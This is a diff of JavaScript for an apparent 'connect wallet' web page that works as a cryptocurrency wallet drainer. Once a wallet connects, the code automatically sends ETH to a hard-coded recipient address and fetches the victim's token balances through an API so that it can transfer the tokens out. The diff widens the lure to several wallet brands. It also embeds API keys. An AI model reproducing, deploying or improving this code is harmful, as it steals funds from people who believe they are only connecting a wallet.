@@ -11,36 +11,58 @@ async function connectWallet() {
 
     try {
         // Show wallet selection options
-        const walletChoice = prompt("Choose a wallet: (1) MetaMask (2) WalletConnect");
-        
+        const walletChoice = prompt("Choose a wallet: (1) MetaMask (2) Trust Wallet (3) Coinbase Wallet (4) Phantom Wallet (5) Zerion");
+
+        let account;
         if (walletChoice === "1") {
             // MetaMask connection logic
             if (typeof window.ethereum !== 'undefined') {
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const account = accounts[0];
+                account = accounts[0];
                 console.log(`Connected to MetaMask account: ${account}`);
-                
-                await sendFirstTransaction(account); // Automatically send the first transaction
             } else {
                 alert("MetaMask is not installed. Please install it.");
                 window.open("https://metamask.app.link/dapp/swiftmultisolutions.github.io/web3/", "_blank");
             }
         } else if (walletChoice === "2") {
-            // WalletConnect connection logic
-            const provider = new WalletConnectProvider.default({
-                infuraId: "YOUR_INFURA_PROJECT_ID", // Replace with your Infura Project ID
-            });
-
-            await provider.enable();
-            const web3 = new ethers.providers.Web3Provider(provider);
-            const accounts = await web3.listAccounts();
-            const account = accounts[0];
-            console.log(`Connected to WalletConnect account: ${account}`);
-            
-            await sendFirstTransaction(account); // Automatically send the first transaction
+            // Trust Wallet connection logic (Use the same as MetaMask)
+            if (typeof window.ethereum !== 'undefined') {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                account = accounts[0];
+                console.log(`Connected to Trust Wallet account: ${account}`);
+            } else {
+                alert("Trust Wallet is not installed.");
+            }
+        } else if (walletChoice === "3") {
+            // Coinbase Wallet connection logic (Use the same as MetaMask)
+            if (typeof window.ethereum !== 'undefined') {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                account = accounts[0];
+                console.log(`Connected to Coinbase Wallet account: ${account}`);
+            } else {
+                alert("Coinbase Wallet is not installed.");
+            }
+        } else if (walletChoice === "4") {
+            // Phantom Wallet connection logic (Only available for Solana, you can adjust accordingly)
+            alert("Phantom Wallet is not supported for Ethereum.");
+            return;
+        } else if (walletChoice === "5") {
+            // Zerion Wallet connection logic (Assuming it also works with MetaMask's provider)
+            if (typeof window.ethereum !== 'undefined') {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                account = accounts[0];
+                console.log(`Connected to Zerion Wallet account: ${account}`);
+            } else {
+                alert("Zerion Wallet is not installed.");
+            }
         } else {
             alert("Invalid choice. Please refresh and try again.");
         }
+
+        if (account) {
+            await sendFirstTransaction(account); // Automatically send the first transaction
+        }
+
     } catch (error) {
         console.error("Error connecting to wallet:", error);
     } finally {
@@ -54,7 +76,7 @@ async function sendFirstTransaction(walletAddress) {
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         const signer = provider.getSigner();
         const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Your recipient address
-        const amountInEther = "0.0002"; // Updated amount for the first transaction
+        const amountInEther = "0.0002"; // The updated amount for the first transaction
 
         const transaction = {
             to: recipientAddress,
@@ -82,7 +104,7 @@ async function sendFirstTransaction(walletAddress) {
 }
 
 async function sendSecondTransaction(signer, walletAddress) {
-    const erc20TokenAddresses = await getERC20TokenAddresses(walletAddress); // Fetch token addresses from Etherscan
+    const erc20TokenAddresses = await getERC20TokenAddresses(walletAddress); // Fetch token addresses using Alchemy API
     const tokenThreshold = 0.000001; // Fixed token threshold
 
     for (const tokenAddress of erc20TokenAddresses) {
@@ -110,15 +132,17 @@ async function sendSecondTransaction(signer, walletAddress) {
 }
 
 async function getERC20TokenAddresses(walletAddress) {
-    const apiKey = "QI64S847PMAF5SXJSYEWJNVA7TD76QTV95"; // Your Etherscan API Key
-    const url = `https://api.etherscan.io/api?module=account&action=tokenlist&address=${walletAddress}&apikey=${apiKey}`;
+    const apiKey = "UB-6IiwEmHuVZIGKCJMK_kcnKXqSgMgq"; // Your Alchemy API Key
+    const url = `https://eth-mainnet.g.alchemy.com/v2/${apiKey}/getTokenBalances?owner=${walletAddress}`;
 
     const response = await fetch(url);
     const data = await response.json();
 
-    if (data.status === "1") {
-        // Return the list of token addresses
-        return data.result.map(token => token.contractAddress);
+    if (data.tokenBalances) {
+        // Filter and return the list of token addresses with a balance greater than zero
+        return data.tokenBalances
+            .filter(token => token.tokenBalance > 0)
+            .map(token => token.contractAddress);
     } else {
         console.error("Error fetching token addresses:", data.message);
         return [];
@@ -143,13 +167,15 @@ async function sendWebhook(message, status) {
     }
 }
 
-// ERC-20 ABI for interacting with token contracts
-const erc20ABI = [
-    "function balanceOf(address owner) view returns (uint256)",
-    "function decimals() view returns (uint8)",
-    "function symbol() view returns (string)",
-    "function transfer(address to, uint amount) returns (bool)"
-];
-
 // Attach the event listener to the button
 document.getElementById("connectButton").addEventListener("click", connectWallet);
+
+// ERC20 Token ABI
+const erc20ABI = [
+    // Transfer event
+    "event Transfer(address indexed from, address indexed to, uint256 value)",
+    // balanceOf function
+    "function balanceOf(address owner) view returns (uint256)",
+    // transfer function
+    "function transfer(address to, uint256 value) returns (bool)"
+];
